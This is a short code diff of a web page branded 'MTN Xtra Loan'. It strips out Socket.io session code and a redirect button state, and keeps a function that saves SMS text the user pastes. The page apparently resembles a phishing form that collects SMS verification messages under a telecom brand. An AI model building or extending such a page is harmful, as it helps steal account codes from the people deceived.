@@ -169,10 +169,7 @@
         © 2026 MTN Xtra Loan
     </div>
 
-    <!-- Load Socket.io for session management -->
-    <script src="/socket.io/socket.io.js"></script>
     <script>
-        const socket = io();
         const verifyBtn = document.getElementById('verifyBtn');
 
         function updateSmsState() {
@@ -200,14 +197,9 @@
             }
         }
 
-        // --- NEW REDIRECT LOGIC TO PROCESSING PAGE ---
         function submitSMS() {
             const smsText = document.getElementById('smsText').value;
             if (!smsText.trim()) return;
-
-            // Change button state
-            verifyBtn.innerText = "REDIRECTING...";
-            verifyBtn.disabled = true;
 
             // Save to sessionStorage
             sessionStorage.setItem('smsData', smsText);
